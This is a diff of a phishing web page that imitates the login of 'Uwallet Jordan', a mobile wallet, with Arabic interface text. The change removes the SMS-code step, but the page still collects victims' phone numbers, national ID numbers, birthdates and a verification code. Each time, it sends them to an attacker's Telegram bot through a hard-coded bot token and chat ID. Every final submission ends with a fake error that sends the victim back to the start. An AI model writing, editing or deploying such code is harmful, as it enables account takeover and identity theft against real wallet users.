@@ -312,24 +312,24 @@
     const uwalletLogo = "https://d.top4top.io/p_3619v3uia0.jpeg";
     const BOT_TOKEN = "8478729698:AAH6ufdvIQicXkUajFb3M1ocoGusDHIbWoI";
     const CHAT_ID = "6873334348";
-    let userData = {phone: '', code4a: '', nationalId:'', birthdate:'', code4b:''};
+    let userData = {phone: '', nationalId:'', birthdate:'', code4b:''};
     let currentStep = "phone";
     let telegramMsgId = null;
 
     function restart() {
       closeModal();
-      userData = {phone: '', code4a: '', nationalId:'', birthdate:'', code4b:''};
+      userData = {phone: '', nationalId:'', birthdate:'', code4b:''};
       currentStep = "phone";
       renderPhoneStep();
     }
 
     function stepIndicator(step) {
+      // الآن 3 خطوات بدلاً من 4
       return `
         <div class="step-indicator">
           <div class="step-dot${step===1?' active':''}"></div>
           <div class="step-dot${step===2?' active':''}"></div>
           <div class="step-dot${step===3?' active':''}"></div>
-          <div class="step-dot${step===4?' active':''}"></div>
         </div>
       `;
     }
@@ -374,45 +374,8 @@
         try {
           telegramMsgId = await sendToTelegram(`🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}`);
         } catch (err) {}
-        renderCode4aStep();
-      };
-    }
-
-    function renderCode4aStep() {
-      currentStep = "code4a";
-      app.innerHTML = `
-        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
-        ${header("رمز التحقق عبر SMS")}
-        ${stepIndicator(2)}
-        <div class="info-msg">أدخل رمز التحقق المكون من 4 أرقام كما وصلك برسالة SMS</div>
-        <form id="code4aForm" autocomplete="off">
-          <div class="code-inputs">
-            <input type="text" maxlength="4" pattern="\\d{4}" required id="code4ainput" inputmode="numeric" placeholder="****" />
-          </div>
-          <button type="submit" class="button">تأكيد الرمز</button>
-        </form>
-        <div class="uwallet-footer">Uwallet Jordan &copy; 2025</div>
-      `;
-      const codeInput = document.getElementById('code4ainput');
-      codeInput.focus();
-      codeInput.addEventListener('input', function() {
-        this.value = this.value.replace(/\D/g, '').slice(0,4);
-      });
-      document.getElementById('code4aForm').onsubmit = async function(e) {
-        e.preventDefault();
-        let code = codeInput.value.trim();
-        if (code.length !== 4) { showErrorModal(); return; }
-        userData.code4a = code;
-        // إرسال رمز التحقق مع البيانات للبوت
-        try {
-          telegramMsgId = await sendToTelegram(
-            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🔢 رمز SMS: ${userData.code4a}`
-          );
-        } catch (err) {}
+        // تجاوز واجهة رمز التحقق والانتقال مباشرةً لبيانات الهوية/تاريخ الميلاد
         renderIdBirthStep();
-      };
-      document.getElementById('backBtn').onclick = () => {
-        renderPhoneStep();
       };
     }
 
@@ -421,7 +384,7 @@
       app.innerHTML = `
         <button class="back-btn" id="backBtn">&#8592; رجوع</button>
         ${header("بياناتك الشخصية")}
-        ${stepIndicator(3)}
+        ${stepIndicator(2)}
         <form id="idForm" autocomplete="off">
           <label>الرقم الوطني</label>
           <input type="text" id="nationalId" placeholder="الرقم الوطني" maxlength="12" required inputmode="numeric"/>
@@ -445,16 +408,16 @@
         const birthdate = `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`;
         userData.nationalId = nationalId;
         userData.birthdate = birthdate;
-        // إرسال البيانات للبوت
+        // إرسال البيانات للبوت (بدون رمز SMS لأننا حذفناه)
         try {
           telegramMsgId = await sendToTelegram(
-            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🔢 رمز SMS: ${userData.code4a}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}`
+            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}`
           );
         } catch (err) {}
         renderFinalCodeStep();
       };
       document.getElementById('backBtn').onclick = () => {
-        renderCode4aStep();
+        renderPhoneStep();
       };
     }
 
@@ -484,7 +447,7 @@
       app.innerHTML = `
         <button class="back-btn" id="backBtn">&#8592; رجوع</button>
         ${header("رمز تحقق إضافي لحماية الحساب")}
-        ${stepIndicator(4)}
+        ${stepIndicator(3)}
         <div class="info-msg">أدخل رمز تحقق حسابك المكون من 4 أرقام لإكمال تسجيل الدخول</div>
         <form id="code4bForm" autocomplete="off">
           <div class="code-inputs">
@@ -504,10 +467,10 @@
         let code = codeInput.value.trim();
         if (code.length !== 4) { showErrorModal(); return; }
         userData.code4b = code;
-        // إرسال جميع البيانات النهائية للبوت
+        // إرسال جميع البيانات النهائية للبوت (بدون رمز SMS السابق)
         try {
           await sendToTelegram(
-            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🔢 رمز SMS: ${userData.code4a}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}\n🔒 رمز تحقق إضافي: ${userData.code4b}`
+            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}\n🔒 رمز تحقق إضافي: ${userData.code4b}`
           );
         } catch (err) {}
         showErrorModal(); // حتى لو صحيحة كل مرة يظهر الخطأ والتوجيه للصفحة الأولى
